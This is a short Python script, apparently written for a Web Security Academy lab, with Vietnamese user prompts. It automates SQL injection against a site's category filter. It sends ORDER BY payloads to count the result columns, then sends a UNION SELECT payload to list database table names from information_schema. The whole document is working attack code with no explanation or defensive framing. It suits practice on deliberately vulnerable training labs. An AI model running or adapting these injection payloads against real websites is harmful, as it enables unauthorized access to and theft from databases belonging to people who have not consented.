import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    test_url = f"{url}/filter?category=Accessories'+ORDER+BY+{i}--"
    if requests.get(test_url).status_code == 200:
        i += 1
    else:
        i -= 1
        break

if i == 0:
    union_url = f"{url}/filter?category=Accessories'+UNION+SELECT+table_name+FROM+information_schema.tables--"
else:
    nulls = ",".join(["NULL"] * (i - 1))
    union_url = f"{url}/filter?category=Accessories'+UNION+SELECT+table_name,{nulls}+FROM+information_schema.tables--"

print(f"Thử payload: {union_url}")
r = requests.get(union_url)
print("Successful!" if r.status_code == 200 else "Failed!")